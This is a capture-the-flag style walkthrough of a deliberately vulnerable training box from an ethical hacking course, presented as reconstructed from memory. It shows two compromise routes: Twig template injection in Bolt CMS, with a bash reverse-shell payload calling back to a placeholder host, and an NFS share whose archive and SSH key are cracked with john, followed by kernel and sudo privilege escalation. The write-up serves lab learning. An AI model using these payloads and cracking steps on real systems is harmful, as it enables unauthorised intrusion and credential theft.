# Dev

> **Details reconstructed from memory of my own completed walkthrough — exact commands/outputs may be paraphrased.**

**Platform:** TCM Security — Practical Ethical Hacking (PEH) Capstone  
**Difficulty:** Intermediate  
**Category:** Linux, NFS, Bolt CMS, Twig SSTI, privilege escalation

![OS](https://img.shields.io/badge/OS-Linux-yellow?style=flat-square&logo=linux)

![Technique](https://img.shields.io/badge/Foothold-SSTI%20%2F%20NFS-orange?style=flat-square)

![Status](https://img.shields.io/badge/Status-Educational-blue?style=flat-square)

---

## Overview

Dev is one of the capstone boxes from TCM Security's **Practical Ethical Hacking** course. It is a Linux host exposing a web stack (Apache + **Bolt CMS**) alongside an open **NFS** export, and it is deliberately solvable by **two different routes**. I completed it both ways to compare an "attacker creativity" path against the "intended" path:

- **Path A — SSTI via Bolt CMS:** register/log in to the Bolt backend, abuse the template editor to plant a malicious **`.twig`** file, trigger **server-side template injection (SSTI)** for a `www-data` shell, then escalate with the **copy-fail kernel CVE**.
- **Path B — intended (NFS → SSH → sudo):** enumerate the NFS export, recover and crack a protected archive to obtain an SSH private key, log in as a real user, and escalate through a **`sudo` misconfiguration** (GTFOBins).

Documenting both reinforced that a single box often has more than one valid chain, and that enumeration breadth (web **and** NFS) is what reveals the options.

---

## Reconnaissance

I began with a full **nmap** service scan:

```bash
nmap -sC -sV -p- -oN dev-full.txt <target-ip>
```

The surface that mattered:

- **22/tcp** — OpenSSH
- **80/tcp** — Apache (a basic/landing site)
- **8080/tcp** — Apache hosting **Bolt CMS**
- **111/tcp & 2049/tcp** — rpcbind / **NFS**

Two independent footholds stood out immediately: the **Bolt CMS** application on 8080 (web attack surface) and the **NFS** service (file-share attack surface). I enumerated both before committing to a path.

---

## Path A — SSTI via Bolt CMS (the creative route)

### 1. Access the Bolt backend

Bolt CMS exposes its admin area at **`/bolt`**. I obtained backend access by creating/using an account on the application, which put me into the authenticated dashboard where Bolt lets you manage content and, crucially, **edit theme template files**.

### 2. Plant a malicious Twig template

Bolt themes are rendered with **Twig**. The backend file/theme editor allowed me to create or modify a **`.twig`** template under the active theme. Twig, when attacker-controlled, is vulnerable to **server-side template injection** — expressions in the template are evaluated server-side, which can be chained into command execution.

A representative SSTI → RCE payload placed inside the `.twig` file:

```twig
{{ ['id'] | filter('system') }}
```

and, to upgrade to a full reverse shell:

```twig
{{ ['bash -c "bash -i >& /dev/tcp/<your-ip>/4444 0>&1"'] | map('system') | join }}
```

### 3. Trigger and catch the shell

With a listener running (`nc -lvnp 4444`), I requested the page that renders the modified template. Twig evaluated the injected expression server-side and executed my command, giving me a reverse shell as **`www-data`**.

### 4. Privilege escalation — copy-fail kernel CVE

From the `www-data` context I ran standard local enumeration (`id`, `uname -a`, `sudo -l`, SUID sweep) and the kernel was vulnerable to the **`authencesn` / `CVE-2026-31431`** bug. I used the same page-cache write primitive documented in my [Copy Fail writeup](copy-fail-cve-2026-31431.md) to patch a setuid binary in place and escalate from the web user straight to **root**.

---

## Path B — intended route (NFS → SSH → sudo)

### 1. Enumerate and mount the NFS export

```bash
showmount -e <target-ip>
sudo mount -t nfs <target-ip>:/srv/nfs /mnt/dev -o nolock
```

The export contained a **password-protected archive** (a `save.zip`-style file) staged where it should never have been world-readable.

### 2. Crack the archive

I cracked the archive password offline with a dictionary attack:

```bash
zip2john save.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# or: fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

Inside were a **`todo`/notes file** and an **SSH private key (`id_rsa`)** belonging to a real system user. The key itself carried a passphrase, which I also cracked:

```bash
ssh2john id_rsa > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

### 3. SSH foothold

With the key and recovered passphrase I logged in as the legitimate user:

```bash
chmod 600 id_rsa
ssh -i id_rsa <user>@<target-ip>
```

### 4. Privilege escalation — sudo misconfiguration

On the host I ran `sudo -l` and found the user was permitted to run a binary as root. That allowed command — a classic **GTFOBins** pattern — let me spawn a root shell (e.g. shelling out from the permitted binary, or abusing its file-read/write to drop a root payload). I confirmed `id` returned `uid=0(root)` and captured the proof.

---

## Proof & Loot

Both paths converged on **root**, from which I collected the capstone proof:

```bash
id                 # uid=0(root)
cat /root/*.txt    # root proof
cat /home/*/*.txt  # user proof
```

---

## Lessons Learned

Dev was the box that taught me **boxes are rarely single-track**. The intended NFS→SSH→sudo chain is clean, but the Bolt CMS backend offered a completely separate SSTI foothold that I'd have missed if I'd stopped enumerating after finding the open NFS share.

Key takeaways:

- **Enumerate every service, not just the first useful one.** Having both the web app and NFS mapped is what made two paths possible.
- **Twig SSTI is a real RCE class, not a party trick** — any CMS that lets a low-trust user edit templates (Bolt, here) is one payload away from server-side execution.
- **NFS exports are a frequent loot source.** A mountable share holding a crackable archive with an SSH key is a textbook misconfiguration, and `zip2john`/`ssh2john` + `rockyou` resolves it quickly.
- **Always run `sudo -l` first.** The intended privesc was pure configuration abuse via GTFOBins — no exploit needed — which is faster and quieter than the kernel CVE I used on Path A.

Running it twice connected directly to my other repo writeups: the SSTI foothold mirrors my web-exploitation practice, and the Path A privesc reuses the exact [`authencesn` kernel technique](copy-fail-cve-2026-31431.md) from Copy Fail.
